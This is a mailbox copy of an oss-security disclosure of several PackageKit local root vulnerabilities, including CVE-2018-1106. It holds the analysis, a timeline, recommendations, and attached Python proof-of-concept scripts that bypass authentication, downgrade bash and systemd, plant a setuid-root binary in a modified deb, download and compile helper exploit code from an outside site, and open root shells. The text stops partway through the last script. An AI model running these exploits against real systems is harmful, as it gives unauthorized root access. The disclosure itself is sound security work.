X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["51250" "Monday" "23" "April" "2018" "16:44:01" "+0200" "Matthias Gerstner" "mgerstner@suse.de" "<20180423144401.6bpvmnvgwrz6fqx7@f195.suse.de>" "1624" "[oss-security] Multiple local root vulnerabilities involving PackageKit CVE-2018-1106" nil nil nil "4" "2018042314:44:01" "[oss-security] Multiple local root vulnerabilities involving PackageKit CVE-2018-1106" (number mark "U       mgerstner@su Apr 23 1624/51250 " thread-indent "\"[oss-security] Multiple local root vulnerabilities involving PackageKit CVE-2018-1106\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 13973 invoked by uid 550); 23 Apr 2018 14:53:52 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 3863 invoked from network); 23 Apr 2018 14:44:15 -0000
X-Virus-Scanned: by amavisd-new at test-mx.suse.de
Date: Mon, 23 Apr 2018 16:44:01 +0200
From: Matthias Gerstner <mgerstner@suse.de>
To: oss-security@lists.openwall.com
Message-ID: <20180423144401.6bpvmnvgwrz6fqx7@f195.suse.de>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha1;
	protocol="application/pgp-signature"; boundary="ay53o7hp4dmuctmr"
Content-Disposition: inline
User-Agent: NeoMutt/20170421 (1.8.2)
Subject: [oss-security] Multiple local root vulnerabilities involving PackageKit
 CVE-2018-1106

--ay53o7hp4dmuctmr
Content-Type: multipart/mixed; boundary="pmcieas4bqehbboh"
Content-Disposition: inline


--pmcieas4bqehbboh
Content-Type: text/plain; charset=iso-8859-1
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

Hello list,

I am forwarding this email which was previously disclosed to the
linux-distros mailing list. I made only minor modifications to the
original report (marked with "Update" where appropriate).

Following is an analysis of PackageKit and the discussion of a number of
vulnerabilities that I found to be exploitable in its context.

# 1. What is PackageKit?

PackageKit is a software suite designed to allow easy software
installation and maintenance for end-users across distributions. It
abstracts the various package management software found in today's Linux
distributions and provides a unified interface for graphical user
interface programs to interact with the package management.

PackageKit's main component is a daemon `packagekitd` which implements a
D-Bus interface. Clients can retrieve information about installed
packages and can request package management actions to be performed.

A backend within `packagekitd` translates the abstract PackageKit
commands into actual package management commands. Backends exist for all
major Linux package management systems like zypper, yum, apt and others.
PackageKit is enabled by default on most if not all major Linux
distributions when a fully integrated desktop environment like GNOME or
KDE is installed.

For the purposes of this analysis I looked into openSUSE Leap 42.3,
Debian 9 Strech, Ubuntu 17.10, CentOS 7.4.1708 and Fedora 27 which
covers the major backends zypper, apt, yum and dnf. I will leave out the
version numbers for the rest of this analysis for brevity. There exist a
number of additional backends that I did not look into.

Upstream repository: https://github.com/hughsie/PackageKit.git
Upstream website: https://www.freedesktop.org/software/PackageKit/

# 2. PackageKit's Security Approach

PackageKit uses the polkit permissions framework to authorize individual
operations. It has been a code review of the implementation of these
polkit actions within PackageKit that led me to the findings discussed
in this analysis.

One important decision that upstream made is that it is deemed safe that
regular users can install validly signed packages in the system without
requiring administrator authentication. The motivation for this seems to
be improved usability for end users. This is also documented here:

https://github.com/hughsie/PackageKit/blob/master/policy/org.freedesktop.pa=
ckagekit.policy.in#L33

> - Normal users do not need authentication to install signed packages
>   from signed repositories, as this cannot exploit a system.
> - Paranoid users (or parents!) can change this to 'auth_admin' or
> 'auth_admin_keep'.

The related polkit action is named `org.freedesktop.packagekit.package-inst=
all`.

The Linux distributions considered in this analysis ship a polkit policy
file that requires `auth_admin` or `auth_admin_keep` for the
installation of signed packages as well. However, there is also a custom
polkit rule shipped by PackageKit that allows local users in an active
session and that are members of the group `wheel` to install signed
packages without admin authorization:

https://github.com/hughsie/PackageKit/blob/master/policy/org.freedesktop.pa=
ckagekit.rules

This rule file is installed on openSUSE, Fedora and CentOS unmodified.
Ubuntu and Debian ship a different rule file that does not allow this.

# 3. Installation of Signed Packages without Administrator Authentication (=
Security Issue 1)

During my code review I found a section of code that indicated that
regardless of what the polkit configuration consists of it is always
possible to install signed packages without any form of authentication.
The relevant code location is here:

https://github.com/hughsie/PackageKit/blob/master/src/pk-transaction.c#L2354

If reinstallation of packages is allowed, then an authentication attempt
is made by `packagekitd` but the outcome is ignored. The flag
`PK_TRANSACTION_FLAG_ENUM_ALLOW_REINSTALL` is under user control,
however. There is currently no way to avoid this loophole in PackageKit
by means of configuration files.

PackageKit comes with a command line utility called `pkcon` that can be
used to perform PackageKit operations. There are two general
possibilities how to install packages:

- `pkcon install [options] <package>` installs a package from the
  configured package manager system repositories by name.
- `pkcon install-local [options] <package>` installs a package from a
  user supplied package manager archive file (e.g. rpm or deb archive).

The reinstall loophole can be used interactively like this:

```
# performed on CentOS 7.4.1708, the download paths in /var/cache differ
# between distributions.

$ pkcon install --only-download zsh
$ pkcon install-local --allow-reinstall /var/cache/yum/x86_64/7/base/packag=
es/zsh-5.0.2-28.el7.x86_64.rpm
```

The second `pkcon` call will trigger the authentication dialog, but even
if the password is wrong or the dialog is canceled, the installation of
the package will continue.

The only distribution I looked into that does not allow this is Fedora
which seems to use the dnf backend instead of the yum backend. The
current Fedora release can therefore be considered not affected by the
issues discussed in this analysis.

Update: This security issue was assigned CVE-2018-1106. The bugfix
performed by upstream is found in attachment
0001-Do-not-set-JUST_REINSTALL-on-any-kind-of-auth-failur.patch.

# 4. Downgrade of Existing Packages (Security Issue 2)

Even though installation of signed packages by regular users is
considered safe by upstream, it should not be possible to downgrade
existing packages. A separate polkit action
`org.freedesktop.packagekit.package-downgrade` should be triggered in
this case. The individual PackageKit backends are responsible to
implement this logic, however. It turned out that not every backend
implements this correctly. Using the above approach with `pkcon
install-local --allow-reinstall` it is possible to downgrade even
important system packages without entering the administrator password in
the following cases:

- apt backend (tested on Ubuntu, Debian)
- zypp backend (tested on openSUSE)

Only the yum and dnf backends (tested on CentOS, Fedora) implement the
downgrade protection correctly.

Using this possiblity a regular user can downgrade packages to
vulnerable versions that open up further attack vectors for gaining
privileges.

I have attached a number of proof of concept scripts that demonstrate
this:

- `pk_downgrade_debian_bash.py`: this downgrades bash on Debian 9
  Stretch to an old one that is still vulnerable to "Shell Shock".
- `pk_downgrade_opensuse_systemd.py`: This downgrades systemd on
  openSUSE version 228 that is vulnerable to CVE-2016-10156. This one is
  accompanied by `opensuse_exploit_systemd.py` to complete the root
  exploit. This is not a 100 % root exploit, it requires some extra
  opportunity that requires systemd to create a new timer stamp file in
  /var/lib/systemd/timers.

# 5. Installation of Signed Packages is Still Dangerous (Security Issue 3)

Even if a user is not able to downgrade existing packages without
administrator privileges there is still a security issue to consider. A
regular user can install local package files downloaded from the
Internet that carry a valid signature. When the package in question is
not installed yet in the system then this does not count as a downgrade
but as a fresh installation.

This opens a surprisingly large action space to regular users:

- tools for constructing exploits can be easily obtained from the system
  repositories or the Internet.
- outdated software with known bugs can be installed in some
  circumstances. On some distributions year old packages with valid
  signatures can be installed this way.
- packages can contain scriptlets for performing runtime package setup.
  These scriptlets may provide additional attack surface when they can
  be triggered at the discretion of regular users.

I have attached two further PoC scripts that demonstrate some of these
points:

- `pk_root_debian_ntfs3g.py`: This installs an old ntfs-3g package on
  Debian that is vulnerable to CVE-2017-0358 and exploits it. This
  variant works only if the `fuse` kernel module is not yet loaded.
- `pk_root_ubuntu_firejail.py`: This installs an old firejail package
  on Ubuntu that is vulnerable to CVE-2017-5180 and exploits it.

On CentOS I have been able to construct an attack (no PoC) using CentOS
7.0 packages for abrt 2.1.11-12.el7 which is vulnerable to
CVE-2015-1862. This only worked if abrt was not yet installed, however
(and it is installed by default). There may be systems out there that
fulfill this condition though.

These PoCs also show that all necessary tools like compiler, kernel
headers etc. can be easily installed to construct the attack.

My tests showed that on Ubuntu packages dating back to at least 2012 can
be installed as signed packages. On Debian packages dating back to 2001
can be installed. But this may also be due to the issue described in the
following section 7). On CentOS 7.4 any packages dating back to CentOS
7.0 can be installed as signed packages. On openSUSE Leap 42.3 packages
from openSUSE 11.4 dating from the year 2012 can be installed as signed
packages. On Fedora (27) only packages for the same major/minor version
can be installed.

There exist probably other attacks that can be constructed by installing
outdated packages this way.

# 6. Missing Sanitization and Safety Measure of User Supplied Input Files

I followed the track of the user supplied archive paths passed to
`packagekitd` to find out how the user owned archives are handled by the
daemon. It turned out that the common `packagekitd` code takes no
precautions to copy the file into a safe space that is no longer
accessible by the client. This is the job of the backends. The zypp and
yum backends do this and copy the file over into a temporary directory
owned by root. They subsequently build a local RPM repository from the
copied RPM file and operate on it.

The apt backend, however, does not do this. The path passed from the
client is passed unmodified into the libapt-pkg code. I am not sure
whether the libapt-pkg code is prepared to process a file under user
control. My worry was and is that there could be race condition involved
that would allow the user to replace all or part of the supplied deb
archive by something malicious after the signature verification passed.

I also found that the client side code makes some effort to sanitize
archive paths in `pk_client_convert_real_paths()`:

https://github.com/hughsie/PackageKit/blob/master/lib/packagekit-glib2/pk-c=
lient.c#L308

The daemon code itself performs no such sanitization, however. I have
not found any actual attack vectors based on this yet. But it is
possible to pass symlink paths and relative paths to the daemon and the
daemon passes it to its backends. I am just adding this to the report
for completeness, maybe someone else is interested in this and finds out
more.

# 7. Lacking Signature Check in the apt backend? (Security Issue 4)

While I looked into the situation described in 6) I encountered an even
worse condition in the apt backend: It seems to be possible to install
modified deb packages without admin authentication. This is demonstrated
in the attached PoC `pk_apt_install_modified.py`. This PoC works on
Debian and Ubuntu. It downloads a validly signed package, injects a
setuid-root binary, installs it and runs it to gain root privileges.

I have not further analyzed where this security leak originates, because
I am not familiar with the libapt-pkg code and I need the help of the
community to identify possible further security issues involved.

Update: I was told by Debian maintainers that individual deb packages
don't carry a signature but only repositories. So it looks like the apt
backend would need to handle installation of local deb files completely
different to perform signature verification.

# 8. Affected Versions

The basic issue described in 3) that allows to circumvent the polkit
configuration was introduced via git commit:
f176976e24e8c17b80eff222572275517c16bdad and affected versions
include >=3D 1.0.10 up until current 1.1.9.

The missing downgrade protection described in 4) has probably been
always present in the affected backends but I did not check up on it.

The issue of installing new signed packages without admin authorization
as described in 5) is by PackageKit design and exploitability depends on
the distribution's configuration and on the existence of issue 3).

Since I don't know what exactly the problem is that causes modified
packages to be installed in the apt backend as described in 7) I can't
make any statements here at the moment.

Update: With security issue 1 (CVE-2018-1106) fixed, the other findings
in this report should not pose an immediate danger as long as the
polkit configuration requires root privileges for the involved polkit
actions. Only administrators should then be able to reach the code
paths in question.

# 9. Recommendations

My personal recommendation to prevent the issues described in 3), 4) and
5) is to not allow regular users to perform any of the involved actions
without admin authentication. To achieve this there must be no code in
place that circumvents the polkit configuration. The upstream polkit
rules file that allows active local users in the group wheel to install
packages without authentication should be dropped.

Update: The attached patch provided by upstream will fix security issue
3) and thereby allow to configure PackageKit safely.

Regarding the issue described in 4) the backends should additionally
correctly implement the detection of downgrades and call the appropriate
polkit actions.

Regarding the issue described in 7) I have not enough insight to give
any recommendation (except of course, not to allow installation of
untrusted packages without at least asking for authorization for
org.freedesktop.packagekit.package-install-untrusted).

The discussed PackageKit backends may be used by other distributions
than considered in this report. These distributions should be identified
and checked as well. Also the less widespread backends that have not
been considered in this analysis should be checked for their behaviour
and affectedness.

# 10. Timeline

- 2018-03-26: I found out about the issues described in 3) and 4) and conta=
cted
  upstream about the issue and voiced some general concerns. Upstream
  basically told me installing signed packages without authentication is "by
  design" and unless I can show some working exploit this would not be wort=
h a
  CVE. Preventing downgrades would be the job of the backends and is no iss=
ue in
  packagekitd itself.
- 2018-04-03: After further analysis and testing I was able to devise the
  PoCs presented in 5).
- 2018-04-05: I noticed the situation described and exploited in 7).
- 2018-04-09: Finished writing this report and putting together PoCs.
  Published on linux-distros.
- 2018-04-11: Red Hat Product Security assigned CVE-2018-1106 for
  security issue 1 described in 3).
- 2018-04-23: Published on oss-sec.

Cheers

Matthias

--=20
Matthias Gerstner <matthias.gerstner@suse.de>
Dipl.-Wirtsch.-Inf. (FH), Security Engineer
https://www.suse.com/security
Telefon: +49 911 740 53 290
GPG Key ID: 0x14C405C971923553

SUSE Linux GmbH
GF: Felix Imend=F6rffer, Jane Smithard, Graham Norton
HRB 21284 (AG Nuernberg)

--pmcieas4bqehbboh
Content-Type: text/x-python; charset=us-ascii
Content-Disposition: attachment; filename="opensuse_exploit_systemd.py"
Content-Transfer-Encoding: quoted-printable

#!/usr/bin/python
# vim: noet ts=3D8 sts=3D8 sw=3D8

# Author: Matthias Gerstner <matthias.gerstner@suse.de>
# SUSE Linux GmbH
# Date: 2018-04-06
#
# This script exploits CVE-2016-10156 in systemd. It is designed to run on
# openSUSE Leap 42.3.
#
# Preconditions:
#	- systemd 228 is installed
#	- a new timer file in /var/lib/systemd/timers has been created with
#	mode 7777.
#	- PackageKit is installed for installing a compiler w/o admin
#	authentication
#
# This program downloads and build the necessary tools to write a working
# setuid root binary into the timer file and start a root shell.
#
# Should any graphical password prompts popup (from pkcon) simply cancel th=
em.

from __future__ import print_function
import os
import subprocess
import functools
import urllib2
import stat

call =3D functools.partial(subprocess.call, close_fds =3D True, shell =3D F=
alse)
check_output =3D functools.partial(subprocess.check_output, close_fds =3D T=
rue, shell =3D False)
popen =3D functools.partial(subprocess.Popen, close_fds =3D True, shell =3D=
 False)

def download_url(url):

	base =3D url.split('/')[-1]
	print("Downloading", url, "to", base)
	con =3D urllib2.urlopen(url)

	with open(base, 'w') as fd:
		while True:
			chunk =3D con.read(4096)

			if not chunk:
				break

			fd.write(chunk)

	return os.path.join( os.getcwd(), base )

def build_prog_from_file(src):

	base =3D os.path.splitext(src)[0]
	cmdline =3D [gcc, src, "-o", base]
	print("Trying to compile", src)
	print("Using command line", ' '.join(cmdline))

	res =3D call(cmdline)

	if res =3D=3D 0:
		print("Successfully built", src, "in", base)
	else:
		print("Failed to build", src)
		sys.exit(1)

	return os.path.join( os.getcwd(), base )

def run_pkcon(cmdline):

	pkcon =3D "/usr/bin/pkcon"
	cmdline =3D [pkcon, "-y"] + cmdline

	print("Using command line", ' '.join(cmdline))

	# use /dev/null as stdin to suppress authentication dialogs
	with open("/dev/null", 'r') as null:
		res =3D call(
			cmdline,
			stdin =3D null
		)

		if res =3D=3D 0:
			print("Successfully called pkcon")
		else:
			print("pkcon failed")
			sys.exit(1)

# hint is a prefix for finding the right RPM package in the cache (e.g.
# multiple gcc packages with various prefixes are downloaded)
def install_package(pkg, hint):

	cmdline =3D [ "install", "--only-download", pkg ]
	print("Trying to download system package", pkg)
	run_pkcon(cmdline)

	candidates =3D []

	archives_root =3D "/var/cache/zypp/packages/repo-oss/suse/x86_64"

	if not os.path.isdir(archives_root):
		# not quite sure why on some systems different cache paths
		# turn up
		archives_root =3D "/var/cache/zypp/packages/openSUSE-Leap-42.3-0/suse/x86=
_64/"

	# now look up the archive and install it, dependencies are implicitly
	# pulled in by PackageKit
	for archive in os.listdir(archives_root):
		if not archive.endswith(".rpm"):
			continue
		elif not archive.startswith(pkg):
			continue
		elif not archive.startswith(hint):
			continue

		candidates.append(archive)

	if not candidates:
		print("Couldn't determine rpm package to install")
		sys.exit(1)
	elif len(candidates) > 1:
		print("More than one rpm install candidate found:", candidates)
		sys.exit(1)

	pkg_archive =3D os.path.join( archives_root, candidates[0] )

	cmdline =3D [ "install-local", "--allow-reinstall", pkg_archive ]
	print("Trying to install", pkg_archive)
	run_pkcon(cmdline)

def find_setuid_timer():

	systemd_timers_dir =3D "/var/lib/systemd/timers"

	for timer in os.listdir(systemd_timers_dir):

		timer =3D os.path.join( systemd_timers_dir, timer )

		s =3D os.stat(timer)

		if s.st_mode & stat.S_ISUID !=3D 0:
			print("Using", timer, "as exploit setuid file")
			return timer

	print("Failed to find a setuid root file in", systemd_timers_dir)
	sys.exit(1)

timer_file =3D find_setuid_timer()

gcc =3D "/usr/bin/gcc"

# first make sure we have a working compiler
if not os.path.exists(gcc):
	# we need a compiler to build some source on the fly
	install_package("gcc", "gcc-4.8")

# this program helps to change the content of a setuid file
# usually writing to a setuid binary causes the kernel to remove the setuid
# bit. but there is a way around.
create_setgid_url =3D "https://www.halfdog.net/Security/2015/SetgidDirector=
yPrivilegeEscalation/CreateSetgidBinary.c"
create_setgid_src =3D download_url(create_setgid_url)
create_setuid_src =3D create_setgid_src.replace("gid", "uid")

if create_setgid_src =3D=3D create_setuid_src:
	print("Failed to find new filename for", create_setgid_src)
	sys.exit(1)

# we need to replace the system call number, because the original program w=
as
# used to change the GID, we cant to change the UID.
with open(create_setuid_src, 'w') as setuid_file, open(create_setgid_src, '=
r') as setgid_file:

	for line in setgid_file.readlines():

		# replace __NR_setresgid32 by __NR_setresuid32
		line =3D line.replace("0xd2", "0xd0")
		setuid_file.write(line)

create_setuid_bin =3D build_prog_from_file(create_setuid_src)

cmdline =3D [create_setuid_bin, timer_file, "/bin/mount", "x", "nonexistent=
-arg"]
print("Trying to construting setuid root binary via command line:\n")
print(' '.join(cmdline))
print()
res =3D call(cmdline)

if res !=3D 0:
	print("Seems to have failed")
	sys.exit(1)

print("Entering root shell")
call([timer_file, "/bin/bash"])


--pmcieas4bqehbboh
Content-Type: text/x-python; charset=us-ascii
Content-Disposition: attachment; filename="pk_apt_install_modified.py"
Content-Transfer-Encoding: quoted-printable

#!/usr/bin/python3
# vim: noet ts=3D8 sts=3D8 sw=3D8

# Author: Matthias Gerstner <matthias.gerstner@suse.de>
# SUSE Linux GmbH
# Date: 2018-04-05
#
# Proof of concept: installation of a modified package as a regular user via
# PackageKit on Debian/Ubuntu to install a setuid root binary.
#
# As it turns out we can install modified deb packages without entering adm=
in
# credentials. This is an easy one to gain root access.
#
# This script is supposed to be run on Debian 9.4 or Ubuntu 17 as a regular
# user. PackageKit must be installed. chkrootkit must not yet be installed
# (for some reason this only works if no previous installation is there).
#
# This program downloads an old version of the chkrootkit package that carr=
ies
# a valid signature. This specific package is only used, because I am alrea=
dy
# familiar with it and have a script template ready to work with it.
#
# The old chkrootkit version is vulnerable to CVE-2014-0476 but this is of =
no
# concern to the exploit we're using here.
#
# Should a password prompt or dialog appear, simply cancel it to continue.

from __future__ import print_function
import platform
import os, sys
import urllib.request
import subprocess
import functools

call =3D functools.partial(subprocess.call, close_fds =3D True, shell =3D F=
alse)
check_output =3D functools.partial(subprocess.check_output, close_fds =3D T=
rue, shell =3D False)
popen =3D functools.partial(subprocess.Popen, close_fds =3D True, shell =3D=
 False)

def exists_pkg(pkg):

	with open("/dev/null", 'w') as null:
		if call(["dpkg", "-s", pkg], stdout =3D null) =3D=3D 0:
			return True

		return False

def download_url(url):

	base =3D url.split('/')[-1]
	print("Downloading", url, "to", base)
	con =3D urllib.request.urlopen(url)

	with open(base, 'wb') as fd:
		while True:
			chunk =3D con.read(4096)

			if not chunk:
				break

			fd.write(chunk)

	return os.path.join( os.getcwd(), base )

def run_pkcon(cmdline):

	pkcon =3D "/usr/bin/pkcon"
	cmdline =3D [pkcon, "-y"] + cmdline

	print("Using command line", ' '.join(cmdline))

	# use /dev/null as stdin to suppress authentication dialogs
	with open("/dev/null", 'r') as null:
		res =3D call(
			cmdline,
			stdin =3D null
		)

		if res =3D=3D 0:
			print("Successfully called pkcon")
		else:
			print("pkcon failed")
			sys.exit(1)


def install_deb(debs):

	if not isinstance(debs, list):
		debs =3D [ debs ]

	cmdline =3D [ "install-local", "--allow-reinstall" ] + debs
	print("Trying to install", ' '.join(debs))
	run_pkcon(cmdline)

# hint is a prefix for finding the right DEB package in the cache (e.g.
# multiple gcc packages with various prefixes are downloaded)
def install_package(pkg, hint =3D None):

	cmdline =3D [ "install", "--only-download", pkg ]
	print("Trying to download system package", pkg)
	run_pkcon(cmdline)

	candidates =3D []

	archives_root =3D "/var/cache/apt/archives"

	# now look up the archive and install it, dependencies are implicitly
	# pulled in by PackageKit
	for archive in os.listdir(archives_root):
		if not archive.endswith(".deb"):
			continue
		elif not archive.startswith(pkg):
			continue
		elif hint and not archive.startswith(hint):
			continue

		candidates.append(archive)

	if not candidates:
		print("Couldn't determine DEB package to install")
		sys.exit(1)
	elif len(candidates) > 1:
		print("More than one DEB install candidate found:", candidates)
		sys.exit(1)

	pkg_archive =3D os.path.join( archives_root, candidates[0] )

	cmdline =3D [ "install-local", "--allow-reinstall", pkg_archive ]
	print("Trying to install", pkg_archive)
	run_pkcon(cmdline)

def build_prog_from_file(src):

	base =3D os.path.splitext(src)[0]
	cmdline =3D [gcc, src, "-o", base]
	print("Trying to compile", src)
	print("Using command line", ' '.join(cmdline))

	res =3D call(cmdline)

	if res =3D=3D 0:
		print("Successfully built", src, "in", base)
	else:
		print("Failed to build", src)
		sys.exit(1)

	return os.path.join( os.getcwd(), base )

aged_chkrootkit_url_debian =3D "http://archive.debian.org/debian/pool/main/=
c/chkrootkit/chkrootkit_0.47-2_amd64.deb"
aged_chkrootkit_url_ubuntu =3D "http://debian.charite.de/ubuntu/pool/main/c=
/chkrootkit/chkrootkit_0.49-4.1ubuntu1_amd64.deb"

is_ubuntu =3D platform.dist()[0].lower().find("ubuntu") !=3D -1
is_debian =3D platform.dist()[0].lower().find("debian") !=3D -1

if is_ubuntu =3D=3D is_debian:
	print("Failed to identify the distribution I'm running on")
	sys.exit(1)

if is_debian:
	aged_chkrootkit_url =3D aged_chkrootkit_url_debian
else:
	aged_chkrootkit_url =3D aged_chkrootkit_url_ubuntu

aged_chkrootkit =3D download_url(aged_chkrootkit_url)

if os.path.exists("/usr/sbin/chkrootkit"):
	print("chkrootkit is already installed. this won't work")
	sys.exit(1)

print("\n" * 3)
print("Modifying deb package in fakeroot")

# we need fakeroot to modify the chkrootkit contents (we want to set a setu=
id
# root bit which is otherwise not possible)
if not exists_pkg("fakeroot"):
	install_package("fakeroot")

# we need a gcc to compile a setuid root helper binary
gcc =3D "/usr/bin/gcc"
if not os.path.exists(gcc):
	install_package("gcc", "gcc_4%3a")

suid_exec_url =3D "https://www.halfdog.net/Misc/Utils/SuidExec.c"
suid_exec_src =3D download_url(suid_exec_url)
suid_exec_bin =3D build_prog_from_file(suid_exec_src)
suid_exec_base =3D os.path.basename(suid_exec_bin)

print('\n' * 5)

# this is where the "magic" happens: we extract the original deb archive,
# place out setuid helper binary in it, apply the setuid bit and repackage =
the
# whole thing

mod_chkrootkit =3D os.path.join( os.getcwd(), "chkrootkit_mod.deb" )

fakeroot_cmds =3D "mkdir tmp;"\
	"dpkg-deb -R {orig_deb} tmp;"\
	"cp {suid_bin} tmp/usr/sbin;"\
	"chmod 4777 tmp/usr/sbin/{suid_bin_base};"\
	"dpkg-deb -b tmp {mod_deb}".format(
		orig_deb =3D aged_chkrootkit,
		suid_bin =3D suid_exec_bin,
		suid_bin_base =3D suid_exec_base,
		mod_deb =3D mod_chkrootkit
	)

res =3D call(["/usr/bin/fakeroot", "sh", "-c", "{}".format(fakeroot_cmds)])

if res !=3D 0:
	print("Failed to modify deb in fakeroot")
	sys.exit(1)

install_deb(mod_chkrootkit)

installed_suid =3D "/usr/sbin/{}".format(suid_exec_base)

print('\n' * 5)

if not os.path.exists(installed_suid):
	print("The setuid file in", installed_suid, "failed to install?")
	sys.exit(1)

print("Setuid file was installed in", installed_suid, "-> running it")

call( [ installed_suid, "/bin/bash" ] )


--pmcieas4bqehbboh
Content-Type: text/x-python; charset=us-ascii
Content-Disposition: attachment; filename="pk_downgrade_debian_bash.py"
Content-Transfer-Encoding: quoted-printable

#!/usr/bin/python3
# vim: noet ts=3D8 sts=3D8 sw=3D8

# Author: Matthias Gerstner <matthias.gerstner@suse.de>
# SUSE Linux GmbH
# Date: 2018-04-05
#
# Proof of concept: downgrade of packages via PackageKit without admin
# authentication.
#
# This script is supposed to be run on Debian 9 stretch as a regular user.
#
# This program downloads an old bash package and installs it via PackageKit.
# As a result the system will run a bash shell vulnerable to CVE-2014-6271
# (Shell Shock).
#
# The PoC shows that downgrading an important system package is currently
# possible without entering admin credentials. Should a password prompt or
# dialog appear, simply cancel it to continue.

from __future__ import print_function
import os, sys
import urllib.request
import subprocess

def print_pkg_version(pkg):

	print("Currently installed version of {}: ".format(pkg), end =3D '')
	sys.stdout.flush()
	out =3D subprocess.check_output([ "/usr/bin/dpkg", "-s", pkg ])

	for line in out.decode().splitlines():
		if not line.startswith("Version:"):
			continue
		parts =3D line.split(':')
		print(parts[-1], end =3D '', sep =3D '')
		break
	print()

def download_deb(url):

	base =3D url.split('/')[-1]
	print("Downloading", url, "to", base)
	con =3D urllib.request.urlopen(url)

	with open(base, 'wb') as fd:
		while True:
			chunk =3D con.read(4096)

			if not chunk:
				break

			fd.write(chunk)

	return os.path.join( os.getcwd(), base )

def install_deb(deb, pkg_base):

	pkcon =3D "/usr/bin/pkcon"
	cmdline =3D [ pkcon, "install-local", "--allow-reinstall", "-y", deb ]
	print("Trying to install", deb)
	print("Using command line", ' '.join(cmdline))

	with open("/dev/null", 'r') as null:
		res =3D subprocess.call(
			cmdline,
			stdin =3D null,
			close_fds =3D True,
			shell =3D False
		)

		if res =3D=3D 0:
			print("Successfully installed package")
			print()
			print_pkg_version(pkg_base)
			print()
		else:
			print("Failed to install")
			sys.exit(1)

# remove the XAUTHORITY environment variable to avoid the graphical prompt
# (doesn't work actually, the daemons figure this out some other way)
try:
	os.environ.pop("XAUTHORITY")
except:
	pass

aged_bash_url =3D "https://cdimage.debian.org/mirror/cdimage/snapshot/Debia=
n/pool/main/b/bash/bash_4.2+dfsg-0.1_amd64.deb"

deb =3D download_deb(aged_bash_url)

print("\n" * 3)

install_deb(deb, "bash")

print("Testing bash shell shock vulnerability")
bash_test =3D "env x=3D'() { :;}; echo vulnerable' bash -c 'echo hello'"
cmdline =3D [ "/bin/bash", "-c", bash_test ]
print("Running", ' '.join(cmdline))
subprocess.call( cmdline, shell =3D False, close_fds =3D True )


--pmcieas4bqehbboh
Content-Type: text/x-python; charset=us-ascii
Content-Disposition: attachment; filename="pk_downgrade_opensuse_systemd.py"
Content-Transfer-Encoding: quoted-printable

#!/usr/bin/python
# vim: noet ts=3D8 sts=3D8 sw=3D8

# Author: Matthias Gerstner <matthias.gerstner@suse.de>
# SUSE Linux GmbH
# Date: 2018-04-05
#
# Proof of concept: downgrade of packages via PackageKit without admin
# authentication on openSUSE Leap.
#
# This script is supposed to be run on openSUSE Leap 42.3 as a regular user.
#
# This program downloads validly signed systemd-228 RPMs from the SUSE open
# build service. This systemd contains a local root vulnerability
# (CVE-2016-10156).
#
# The PoC shows that installing and downgrading an important system package=
 is
# possible without entering admin credentials. Should a password prompt or
# dialog appear, simply cancel it to continue.

from __future__ import print_function
import os, sys
import urllib2
import subprocess

def print_pkg_version(pkg):

	print("Currently installed version of pkg: ", end =3D '')
	sys.stdout.flush()
	subprocess.call([ "/bin/rpm", "-q", pkg ])

def download_rpm(url):

	base =3D url.split('/')[-1]
	print("Downloading", url, "to", base)
	con =3D urllib2.urlopen(url)

	with open(base, 'w') as fd:
		while True:
			chunk =3D con.read(4096)

			if not chunk:
				break

			fd.write(chunk)

	return os.path.join( os.getcwd(), base )

def install_rpm(rpms, pkg_base):

	pkcon =3D "/usr/bin/pkcon"
	cmdline =3D [ pkcon, "install-local", "--allow-reinstall", "-y" ] + rpms
	print("Trying to install", ' '.join(rpms))
	print("Using command line", ' '.join(cmdline))

	with open("/dev/null", 'r') as null:
		res =3D subprocess.call(
			cmdline,
			stdin =3D null,
			close_fds =3D True,
			shell =3D False
		)

		if res =3D=3D 0:
			print("Successfully installed package(s)")
			print()
			print_pkg_version(pkg_base)
			print()
		else:
			print("Failed to install")
			sys.exit(1)

package_bases =3D [
	"systemd-228-19.1.x86_64.rpm",
	"udev-228-19.1.x86_64.rpm",
	"systemd-sysvinit-228-19.1.x86_64.rpm",
	"libsystemd0-228-19.1.x86_64.rpm"
]

url_base =3D "http://download.opensuse.org/update/leap/42.2/oss/x86_64/"

rpms =3D []

print("Downloading vulnerable systemd-228 packages")

for pkg_base in package_bases:
	rpm =3D download_rpm('/'.join([url_base, pkg_base]))
	rpms.append(rpm)

print("\nInstalling vulnerable RPMs")

install_rpm(rpms, "systemd")

print("\nAfter rebooting or issuing 'systemctl daemon-reload' you will be r=
unning a vulnerable systemd")
print()
print("The files in /var/lib/systemd/timers will be created with setuid bit=
 set once new timers are setup or the old timer stamp files are deleted")
print()
print("A progam like https://www.halfdog.net/Security/2015/SetgidDirectoryP=
rivilegeEscalation/CreateSetgidBinary.c will help writing a suitable setuid=
 binary to one of the files once the setuid bit is set")
print("You only have to change the setresgid system call into a setresuid s=
ystem call")


--pmcieas4bqehbboh
Content-Type: text/x-python; charset=us-ascii
Content-Disposition: attachment; filename="pk_root_debian_ntfs3g.py"
Content-Transfer-Encoding: quoted-printable

#!/usr/bin/python3
# vim: noet ts=3D8 sts=3D8 sw=3D8

# Author: Matthias Gerstner <matthias.gerstner@suse.de>
# SUSE Linux GmbH
# Date: 2018-04-05
#
# Proof of concept: installation of an outdated package as a regular user v=
ia
# PackageKit on Debian to exploit a security defect and subsequently obtain
# root privileges.
#
# This script is supposed to be run on Debian 9 stretch as a regular user.
#
# Preconditions:
#
# - PackageKit must be installed
# - fuse module must not yet be loaded (there is also a variation of the
# exploit that attempts to exhaust the number of open files in the system to
# make the exploit work even if fuse is loaded, but it is not used here).
#
# This program downloads an old version of the ntfs-3g package that carries
# a valid signature and which is installed without admin permissions via
